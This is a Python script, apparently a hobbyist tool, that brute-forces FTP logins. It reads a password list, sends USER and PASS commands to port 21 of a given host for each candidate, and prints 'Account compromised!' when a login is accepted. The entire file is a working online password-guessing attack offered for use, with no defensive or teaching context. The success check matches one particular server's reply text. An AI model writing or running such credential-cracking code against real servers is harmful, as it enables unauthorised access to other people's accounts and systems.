import os
import socket
import sys
def crack(host, user, plist):
	print("[!] Trying to reach host...")
	with open(plist, 'r', encoding='utf-8') as file:
		for lines in file:
			try:
				word = lines.strip()
				s = socket.socket()
				# s = socket.socket(socket.AF_INET, socket_SOCK_STREAM)
				try:
					s.connect((host, 21))
				except socket.gaierror:
					print("\n[-] Hostname not resolved!")
					sys.exit(1)
				payload = "USER {}\r\nPASS {}\r\n".format(user, word)
				reply1 = s.recv(1024)
				reply1d = reply1.decode()
				s.send(payload.encode())
				reply2 = s.recv(1024)
				reply2de = reply2.decode()
				reply3 = s.recv(1024)
				reply3d = reply3.decode()
				if '530 Login authentication failed' in reply3d:
					print("[-] Account Login Failure! Login: {} Password: {} ".format(user, word))
					pass 
				if '230 OK. Current directory is /home/telnete' in reply3d:
					print("[+] Account compromised! Login: {} Password: {} ".format(user, word))
					pass 
			except KeyboardInterrupt:
				print("[-] Exitting..")
				sys.exit()
def main():
	try:
		host = sys.argv[1]
		user = sys.argv[2]
		plist = sys.argv[3]
		crack(host, user, plist)
	except IndexError:
		print("\nUsage: ")
		print("python3 {} <ip> <user> <passwordlist> ".format(sys.argv[0]))
		sys.exit()
main()